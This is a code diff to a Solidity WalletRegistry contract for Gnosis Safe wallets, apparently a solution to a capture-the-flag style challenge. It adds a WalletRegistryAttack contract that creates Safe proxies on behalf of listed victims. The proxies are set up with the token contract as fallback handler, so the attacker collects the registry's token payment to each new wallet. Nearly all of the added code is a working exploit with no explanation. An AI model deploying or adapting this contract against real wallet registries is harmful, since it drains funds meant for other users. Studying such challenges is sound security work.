@@ -6,6 +6,8 @@ import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
 import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
 
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
+
 /**
  * @title WalletRegistry
  * @notice A registry for Gnosis Safe wallets.
@@ -93,5 +95,68 @@ contract WalletRegistry is IProxyCreationCallback, Ownable {
 
         // Pay tokens to the newly created wallet
         token.transfer(walletAddress, TOKEN_PAYMENT);        
+    }
+}
+
+contract WalletRegistryAttack {
+
+    address private owner;
+    address private token;
+
+    constructor(address _token) {
+        owner = msg.sender;
+        token = _token;
+    }
+
+    function _getBytes(
+        address payable masterCopy,
+        address victimAddress,
+        address payable attackerAddress
+    ) private view returns (bytes memory) {   
+        address[] memory owners = new address[](1);
+        owners[0] = victimAddress;
+
+        return abi.encodeWithSelector(
+            GnosisSafe(masterCopy).setup.selector,
+            owners,
+            1,
+            address(0),
+            abi.encode(0),
+            token,
+            token,
+            0,
+            attackerAddress
+        );
+    }
+
+    function attack(
+        address payable masterCopy,
+        address[] calldata victims,
+        address payable attackerAddress,
+
+        address walletFactoryAddress,
+        address masterCopyAddress,
+
+        address walletRegistryAddress
+
+    ) external {
+        for (uint256 index = 0; index < victims.length; index++) {
+            address victimAddress = victims[index];
+            
+            bytes memory attackBytes = _getBytes(
+                masterCopy,
+                victimAddress,
+                attackerAddress
+            );
+
+            address proxy = address(GnosisSafeProxyFactory(walletFactoryAddress).createProxyWithCallback(
+                masterCopyAddress,
+                attackBytes,
+                7,
+                IProxyCreationCallback(walletRegistryAddress)
+            ));
+
+            IERC20(proxy).transfer(owner, 10 ether);
+        }
     }
 }
